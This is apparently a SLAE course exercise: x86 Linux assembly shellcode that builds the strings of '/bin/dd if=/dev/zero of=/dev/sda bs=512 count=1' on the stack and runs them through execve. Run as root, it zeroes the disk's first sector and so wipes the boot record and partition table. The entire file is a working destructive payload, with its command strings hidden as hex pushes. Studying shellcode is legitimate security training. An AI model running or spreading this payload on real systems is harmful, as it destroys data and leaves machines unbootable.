;Description:  sys_execve(/bin/dd if=/dev/zero of=/dev/sda bs=512 count=1). Require root.
;Author:       Paolo Stivanin <https://github.com/polslinux>
;SLAE ID:		  526

global _start
section .text
_start:
  ;/bin/dd if=/dev/zero of=/dev/sda bs=512 count=1
  cdq

  ;count=1
  push edx
  push 0x313d746e
  push 0x756f63aa
  add esp,1
  mov edi,esp

  ;bs=512
  push edx
  push 0x3231353d
  push WORD 0x7362
  mov esi,esp

  ;of=/dev/sda
  push edx
  push 0x6164732f
  push 0x7665642f
  push 0x3d666faa
  add esp,1
  mov eax,esp

  ;if=/dev/zero
  push edx
  push 0x6f72657a
  push 0x2f766564
  push 0x2f3d6669
  mov ecx,esp

  ;//bin/dd
  push edx
  push 0x64642f6e
  push 0x69622f2f
  mov ebx,esp

  push edx
  push edi
  push esi
  push eax
  push ecx
  push ebx
  mov ecx,esp

  xor eax,eax
  mov al,0xb

  int 0x80
